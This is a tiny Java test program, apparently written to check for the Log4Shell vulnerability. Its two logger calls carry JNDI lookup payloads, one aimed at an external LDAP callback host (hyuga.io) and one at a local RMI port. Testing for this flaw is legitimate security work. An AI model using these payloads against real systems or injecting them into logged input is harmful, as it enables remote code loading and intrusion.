package icu.zznq.log4jtest;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Main {
    static final Logger logger = LogManager.getLogger(Main.class.getName());

    public static void main(String[] args) {
        logger.error("${jndi:ldap://hyuga.io:8881/ddd/23333}");
        logger.error("${jndi:rmi://localhost:8881/ddd/1111}");
    }
}
